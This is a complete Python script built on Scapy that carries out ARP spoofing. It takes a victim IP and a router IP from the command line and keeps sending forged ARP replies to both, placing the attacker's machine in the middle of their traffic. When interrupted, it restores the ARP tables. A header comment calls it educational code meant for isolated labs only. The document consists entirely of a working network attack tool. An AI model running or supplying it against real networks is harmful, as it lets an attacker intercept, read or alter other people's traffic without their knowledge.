# =======================================================
# WARNING: Educational / research code only.
# DO NOT RUN this script on production networks or public infrastructure.
# Run only in isolated disposable VMs, host-only virtual networks, or fully controlled lab environments.
# =======================================================

from scapy.all import send, ARP, getmacbyip
import sys
import time


def spoof_arp(
    destination_ip: str,
    destination_mac: str,
    source_ip: str
) -> None:
    send(
        ARP(
            op='is-at',
            pdst=destination_ip,
            hwdst=destination_mac,
            psrc=source_ip
        ),
        verbose=False
    )


def restore_arp(
    destination_ip: str,
    destination_mac: str,
    source_ip: str,
    source_mac: str
) -> None:
    send(
        ARP(
            op='is-at',
            hwsrc=source_mac,
            psrc=source_ip,
            hwdst=destination_mac,
            pdst=destination_ip
        ),
        verbose=False
    )


def spoof() -> None:
    victim_ip: str = sys.argv[1]
    router_ip: str = sys.argv[2]

    victim_mac: str = getmacbyip(victim_ip)
    router_mac: str = getmacbyip(router_ip)

    try:
        while True:
            print('Sending spoofed ARP packets')

            spoof_arp(victim_ip, victim_mac, router_ip)
            spoof_arp(router_ip, router_mac, victim_ip)

            time.sleep(2)
    except KeyboardInterrupt:
        print('\nRestoring ARP Tables...')

        for i in range(4):
            restore_arp(router_ip, router_mac, victim_ip, victim_mac)
            restore_arp(victim_ip, victim_mac, router_ip, router_mac)

            time.sleep(2)

        quit()


spoof()
